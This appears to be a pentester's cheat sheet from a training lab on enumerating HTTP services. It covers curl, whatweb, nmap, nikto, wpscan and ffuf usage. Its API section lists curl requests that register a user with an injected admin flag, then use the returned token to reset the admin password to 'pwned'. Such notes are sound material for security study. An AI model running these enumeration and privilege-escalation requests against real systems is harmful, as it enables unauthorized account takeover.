# HTTP/HTTPS

_Port: 80, 443_

## Service Enumeration

Basic interaction
```bash
curl -i http://$ip/
```
Other curl
```bash
-k      # ignore self-signed certs
-I      # save headers only
-X      # Request option
```
Fingerprint the web tech stack (framework, server, version)
```bash
whatweb http://$ip/
```

nmap enum
```bash
sudo nmap -p80 --script=http-enum 192.168.50.20
```

nikto scan
```bash
nikto -host=http://$ip -maxtime=30m -o $outfile
```

wpscan
```bash
wpscan --url http://$ip -U 'username1,username2' --enumerate u
```

use ffuf recursively
```bash
ffuf -c -w \\
/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt \\
-u http://$ip/FUZZ -recursion -recursion-depth 2
```

debugging check
```text
use F12 and go through the networking, storage, and debugger
inspect page code
robots.txt
discover sitemap
check for headers
```

## API Check

Basic
```bash
curl -i http://192.168.50.16:5002/users/v1
```

Common endpoints
```text
{GOBUSTER}/v1
{GOBUSTER}/v2
```

idk, just more okay?
```text
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```